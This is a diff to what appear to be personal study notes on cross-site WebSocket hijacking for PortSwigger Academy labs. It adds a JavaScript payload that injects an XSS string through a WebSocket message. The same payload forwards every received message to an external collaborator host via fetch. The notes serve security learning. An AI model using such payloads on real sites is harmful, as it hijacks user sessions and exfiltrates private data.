@@ -67,6 +67,8 @@
 * If the handshake request relies solely on session cookies and does not contain any unpredictable parameters, then it is vulnerable to a CSRF attack.  Depending on how the application uses the WebSocket's, we can perform unauthorized actions or retrieve sensitive data that the user can access.
 
    * Example:  The payload below can be used to retrieve sensitive information from the application that belongs to another user.  When we send the "READY" command to the server via the WebSocket message, all the past chat messages will be received.  When the messages are received from the server, they will be sent to attacker's server.  This is possible as cross-site websocket hijacking attacks, allows for 2-way interaction, unlike standard CSRF attacks.
+ 
+   * Host the payload in the Exploit Server:
 
 ```javascript
 <script>
@@ -80,6 +82,21 @@
 </script>
 ```
 
+<br>
+
+* Example Exploitation Payload: Although this does not work in the labs, this is something that can be done to inject XSS through web socket messages to attack other users.  The "message" parameter in the lab was used to communicate/send messages to the server through web socket. 
+
+```javascript
+<script>
+    var ws = new WebSocket('wss://0a97008101b00a8.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("{\"message\":\"<img src=x onerror=alert(1)>\"}");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://a8jc1jg75.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
 
 <br><br>
 
